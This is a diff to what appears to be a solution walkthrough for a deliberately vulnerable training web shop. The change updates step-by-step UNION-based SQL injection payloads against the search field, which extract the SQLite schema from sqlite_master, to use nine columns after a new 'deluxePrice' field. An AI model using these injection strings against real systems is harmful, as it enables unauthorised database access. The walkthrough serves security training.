@@ -161,21 +161,21 @@ error situation and solve this challenge immediately:
    3. `')) UNION SELECT '1', '2', '3' FROM sqlite_master--` fails with
       `number of result columns` error
    4. (...)
-   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
       sqlite_master--` _still fails_ with `number of result columns`
       error
-   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
       sqlite_master--` finally gives you a JSON response back with an
       extra element
-      `{"id":"1","name":"2","description":"3","price":"4","image":"5","createdAt":"6","updatedAt":"7","deletedAt":"8"}`.
+      `{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}`.
 
 10. Next you get rid of the unwanted product results changing the query
     into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
-    '6', '7', '8' FROM sqlite_master--` leaving only the "`UNION`ed"
+    '6', '7', '8', '9' FROM sqlite_master--` leaving only the "`UNION`ed"
     element in the result set
 11. The last step is to replace one of the fixed values with correct
     column name `sql`, which is why searching for `qwert')) UNION SELECT
-    sql, '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master--` solves
+    sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--` solves
     the challenge.
 
 ### Give a devastating zero-star feedback to the store
